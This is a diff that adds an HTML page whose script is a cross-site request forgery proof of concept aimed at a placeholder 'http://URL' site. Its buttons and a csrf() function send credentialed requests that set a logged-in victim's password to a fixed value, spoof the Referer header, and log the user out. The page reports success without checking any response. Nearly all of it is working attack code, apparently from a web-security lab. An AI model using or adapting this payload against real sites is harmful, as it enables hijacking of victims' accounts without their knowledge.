@@ -1,0 +1,46 @@
+	<body>
+		<button onclick="changePassword()">ChangePassword</button>
+		<button onclick="logout()">LogOut</button>
+		<h3 id="log"></h3>
+		<script>
+			function changePassword(){
+				request = new XMLHttpRequest();
+				request.open("POST", "http://URL/change_pass.php", true);
+				    request.withCredentials = true;
+				    request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+				    request.setRequestHeader("Referer","http://URL/change_pass.php")
+				    request.send("password=123123123&confirm_password=123123123&submit=submit");
+				    log.innerHTML+="The password was changed<br>";
+				}
+
+			function logout(){
+				request = new XMLHttpRequest();
+				request.open("GET", "http://URL/logout.php ", true);
+				    request.withCredentials = true;
+				    request.setRequestHeader("Content-Type","appllication/x-www-form-urlencoded");
+				    request.send();
+				    log.innerHTML+="User logged out<br>";
+
+				}
+
+
+			function getConfirm(){
+				request = new XMLHttpRequest();
+				request.open("GET", "http://URL/home.php ", true);
+				    request.withCredentials = true;
+				    request.setRequestHeader("Referer","http://URL/change_pass.php")
+				    request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+				    request.send();
+				    log.innerHTML+="User logged in<br>";
+
+				}
+
+			function csrf(){
+				changePassword();
+				getConfirm();
+				//logout();
+			}	
+
+		</script>
+	</body>
+</html>	
